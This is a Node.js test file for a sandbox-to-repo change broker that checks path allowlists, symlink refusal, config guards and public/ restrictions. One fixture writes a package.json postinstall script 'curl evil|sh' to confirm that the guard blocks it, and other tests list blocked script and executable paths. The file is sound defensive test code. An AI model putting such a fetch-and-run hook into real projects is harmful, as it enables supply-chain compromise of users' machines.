// F2b broker — proves the moved-verbatim listChanges/applyChanges + guards still
// enforce the security boundary, against a temp "repo" + "workdir". applyAllowed,
// CONFIG_GUARD, symlink/realpath all re-run on every apply regardless of trigger.
import { test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, existsSync, realpathSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createBroker } from "../broker.mjs";
import { applyAllowed } from "../guards.mjs";

// NOTE: guards.mjs derives REPO_ROOT from its own location (the real repo). The broker
// validates relative paths against THAT repoRoot when we pass it. We point repoRoot at
// a temp dir and workdirFor at a temp workdir to test apply mechanics in isolation.
let root, repoRoot, workdir;
const broker = () => createBroker({ repoRoot, workdirFor: () => workdir, scrub: (s) => s });

beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "ma-broker-test-"))); // canonicalize /var→/private/var (macOS)
  repoRoot = join(root, "repo");
  workdir = join(root, "work");
  mkdirSync(join(repoRoot, "src"), { recursive: true });
  mkdirSync(join(workdir, "src"), { recursive: true });
  writeFileSync(join(repoRoot, "package.json"), JSON.stringify({ name: "x", scripts: { build: "vite" } }));
  writeFileSync(join(workdir, "package.json"), JSON.stringify({ name: "x", scripts: { build: "vite" } }));
});
afterEach(() => { try { rmSync(root, { recursive: true, force: true }); } catch { /* */ } });

test("listChanges reports a new src file with before=null", async () => {
  writeFileSync(join(workdir, "src", "New.tsx"), "export const N = 1;\n");
  const changes = await broker().listChanges("k");
  const c = changes.find((x) => x.path === "src/New.tsx");
  assert.ok(c);
  assert.equal(c.status, "new");
  assert.equal(c.before, null);
});

test("applyChanges writes an allowed src file into the repo", async () => {
  writeFileSync(join(workdir, "src", "App.tsx"), "export const App = 1;\n");
  const r = await broker().applyChanges("k", ["src/App.tsx"]);
  assert.deepEqual(r, [{ path: "src/App.tsx", ok: true }]);
  assert.equal(readFileSync(join(repoRoot, "src", "App.tsx"), "utf-8"), "export const App = 1;\n");
});

test("CONFIG_GUARD blocks a package.json scripts change (supply-chain/exec)", async () => {
  writeFileSync(join(workdir, "package.json"), JSON.stringify({ name: "x", scripts: { build: "vite", postinstall: "curl evil|sh" } }));
  const r = await broker().applyChanges("k", ["package.json"]);
  assert.equal(r[0].ok, false);
  assert.match(r[0].error, /protected key changed: scripts/);
  // repo package.json untouched
  assert.ok(!readFileSync(join(repoRoot, "package.json"), "utf-8").includes("postinstall"));
});

test("applyAllowed blocks path traversal, .env, .git, node_modules", async () => {
  const r = await broker().applyChanges("k", ["../escape.txt", ".env", ".git/config", "node_modules/x.js"]);
  assert.ok(r.every((x) => x.ok === false && x.error === "path not allowed"));
});

test("applyChanges refuses a symlinked destination (no write-through)", async () => {
  writeFileSync(join(workdir, "src", "link.tsx"), "data\n");
  const outside = join(root, "outside.txt");
  writeFileSync(outside, "victim\n");
  symlinkSync(outside, join(repoRoot, "src", "link.tsx"));
  const r = await broker().applyChanges("k", ["src/link.tsx"]);
  assert.equal(r[0].ok, false);
  assert.match(r[0].error, /symlink/);
  assert.equal(readFileSync(outside, "utf-8"), "victim\n", "symlink target NOT overwritten");
});

test("unchanged file is not reported as a change", async () => {
  writeFileSync(join(workdir, "src", "Same.tsx"), "same\n");
  writeFileSync(join(repoRoot, "src", "Same.tsx"), "same\n");
  const changes = await broker().listChanges("k");
  assert.ok(!changes.some((c) => c.path === "src/Same.tsx"));
});

// Regression — smoke-test finding #3: a /run "build" deliverable (a new static file
// produced by an agent in its sandbox) must SURFACE via /changes and be appliable.
// Before the fix the agent wrote the file at the sandbox root, which was outside the
// appliable scope, so listChanges silently dropped it (files: 0) and apply was
// impossible. public/ is now part of the seeded+appliable scope and the /run prompt
// steers writes there.
test("a /run build deliverable in public/ surfaces via listChanges and applies", async () => {
  mkdirSync(join(workdir, "public"), { recursive: true });
  const html = "<!doctype html><title>Bill Splitter</title><h1>Split the bill</h1>\n";
  writeFileSync(join(workdir, "public", "billsplit.html"), html);

  // surfaces via /changes
  const changes = await broker().listChanges("senior-web-1");
  const c = changes.find((x) => x.path === join("public", "billsplit.html"));
  assert.ok(c, "deliverable must appear in /changes (was files: 0 before the fix)");
  assert.equal(c.status, "new");
  assert.equal(c.before, null);
  assert.equal(c.after, html);

  // and can be applied to the live repo
  const r = await broker().applyChanges("senior-web-1", [join("public", "billsplit.html")]);
  assert.deepEqual(r, [{ path: join("public", "billsplit.html"), ok: true }]);
  assert.equal(readFileSync(join(repoRoot, "public", "billsplit.html"), "utf-8"), html);
});

// Pin the appliable scope (single source of truth for BOTH the copy-sandbox broker and
// the engine worktree broker). src/ + public/ + README + package.json are in; the
// sandbox root and exec/CI dirs stay out — documents why a root-level write is dropped.
test("scope boundary: src/ + public/ appliable, root + exec/CI dirs are not", () => {
  assert.equal(applyAllowed(join("public", "billsplit.html")), true);
  assert.equal(applyAllowed(join("src", "App.tsx")), true);
  assert.equal(applyAllowed("README.md"), true);
  // the original smoke-test failure: a deliverable at the sandbox root is NOT appliable
  assert.equal(applyAllowed("billsplit.html"), false);
  assert.equal(applyAllowed(join("scripts", "evil.sh")), false);
  assert.equal(applyAllowed(join(".github", "workflows", "ci.yml")), false);
  assert.equal(applyAllowed(join("infrastructure", "main.tf")), false);
});

// PUBLIC_GUARD (sr-security): public/ is appliable for STATIC deliverables only —
// never index.html (Vite serves it at / ahead of the SPA → UI swap + token theft) and
// never script/executable types (served verbatim → browser RCE/XSS).
test("PUBLIC_GUARD: public/ static deliverables apply, but index.html + scripts/exec are blocked", () => {
  // allowed static deliverables
  assert.equal(applyAllowed(join("public", "billsplit.html")), true);
  assert.equal(applyAllowed(join("public", "report.html")), true);
  assert.equal(applyAllowed(join("public", "style.css")), true);
  assert.equal(applyAllowed(join("public", "logo.svg")), true);
  assert.equal(applyAllowed(join("public", "data.json")), true);
  // blocked: app-shell override (token-theft vector)
  assert.equal(applyAllowed(join("public", "index.html")), false);
  // blocked: scripts + executables served verbatim
  for (const f of ["evil.sh", "x.py", "a.js", "b.mjs", "c.cjs", "d.ts", "e.tsx", "m.exe", "n.dll", "o.wasm", "p.ps1"]) {
    assert.equal(applyAllowed(join("public", f)), false, `public/${f} must be blocked`);
  }
});
